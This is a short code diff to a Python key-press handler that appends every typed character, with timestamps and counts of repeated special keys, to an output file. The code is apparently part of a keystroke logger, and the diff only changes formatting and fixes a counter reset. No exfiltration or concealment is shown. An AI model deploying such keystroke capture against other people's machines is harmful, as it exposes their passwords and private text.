@@ -17,11 +17,17 @@ def on_press(key):
         append(output_path, f"\n{current_dt}\n") 
     try:
         k = key.char
-        append(output_path, f"{k}") 
+        if spc_count > 1:
+            append(output_path, f"(x{spc_count})")
+        current_spc, spc_count = "", 0
+        append(output_path, f"{k}")
+
     except:
         k = key.name        
-        if k == 'space': text = " "
-        elif k == 'enter': text = "\n"
+        if k == 'space':
+            text = " "
+        elif k == 'enter':
+            text = "\n"
         else:
             if k == current_spc:
                 spc_count += 1
@@ -30,6 +36,7 @@ def on_press(key):
                 current_spc = k
                 if spc_count > 1:
                     append(output_path, f"(x{spc_count})")
+                spc_count = 0
                 text = f"[{k}]"
         append(output_path, text)
 
